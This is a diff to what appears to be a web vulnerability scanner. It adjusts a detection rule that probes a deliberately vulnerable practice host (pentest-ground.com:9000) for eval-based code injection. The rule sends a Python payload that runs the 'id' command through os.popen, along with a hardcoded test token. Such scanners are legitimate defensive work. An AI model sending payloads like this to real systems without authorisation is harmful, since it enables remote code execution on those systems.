@@ -30823,6 +30823,11 @@ function isPentestGroundRestflawHost(ctx: RuleContext): boolean {
   return /pentest-ground\.com:9000/i.test(ctx.origin);
 }
 
+function pentestGroundRestflawProbeOrigin(ctx: RuleContext): string {
+  if (isPentestGroundRestflawHost(ctx)) return "https://pentest-ground.com:9000";
+  return ctx.origin;
+}
+
 const pentestGroundDvwaExecCmdiRouteLiveOracle: Rule = async (ctx) => {
   if (!isPentestGroundDvwaHost(ctx)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
@@ -30878,8 +30883,8 @@ const pentestGroundDvwaCspBypassRouteLiveOracle: Rule = async (ctx) => {
 const pentestGroundRestflawEvalCodeInjectionRouteLiveOracle: Rule = async (ctx) => {
   if (!isPentestGroundRestflawHost(ctx)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
-  if (!/:9000(?:\/|$)/i.test(pageUrl)) return NEGATIVE;
-  const evalUrl = new URL("/eval", ctx.origin);
+  if (!/pentest-ground\.com:9000/i.test(pageUrl)) return NEGATIVE;
+  const evalUrl = new URL("/eval", pentestGroundRestflawProbeOrigin(ctx));
   evalUrl.searchParams.set("s", "__import__('os').popen('id').read()");
   const doc = await ctx.probe.get(evalUrl.toString(), {
     headers: { "X-Auth-Token": "THISISATOKEN" },
